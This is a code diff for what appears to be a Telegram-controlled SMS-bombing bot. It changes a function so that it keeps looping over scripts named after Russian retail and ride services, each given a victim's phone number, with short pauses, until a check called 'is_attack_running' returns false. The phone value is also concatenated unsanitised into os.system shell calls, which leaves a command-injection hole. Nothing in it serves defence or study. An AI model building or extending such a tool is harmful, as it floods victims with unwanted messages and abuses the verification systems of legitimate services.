@@ -16,21 +16,35 @@ import sys
 
 def run_sms(phone, userid):
 
-    os.system("python3 aptekaapril.py " + phone)
+    while True:
+        
+        os.system("python3 uber.py " + phone)
 
-    os.system("python3 citymobil.py " + phone)
+        time.sleep(2)
 
-    os.system("python3 kari.py " + phone)
+        os.system("python3 aptekaapril.py " + phone)
 
-    os.system("python3 mvideo.py " + phone)
+        time.sleep(2)
 
-    os.system("python3 perekrestok.py " + phone)
+        os.system("python3 citymobil.py " + phone)
 
-    os.system("python3 sravni.py " + phone)
+        time.sleep(2)
 
-    os.system("python3 uber.py " + phone)
+        os.system("python3 kari.py " + phone)
 
-    if not utilities.is_attack_running(userid):
-        bot = telebot.TeleBot(config.bot_token)
-        bot.send_message(userid, "СМС остановлены!")
-        return 0
+        time.sleep(2)
+
+        os.system("python3 mvideo.py " + phone)
+
+        time.sleep(2)
+
+        os.system("python3 perekrestok.py " + phone)
+
+        time.sleep(2)
+
+        os.system("python3 sravni.py " + phone)
+
+        if not utilities.is_attack_running(userid):
+            bot = telebot.TeleBot(config.bot_token)
+            bot.send_message(userid, "СМС остановлены!")
+            return 0
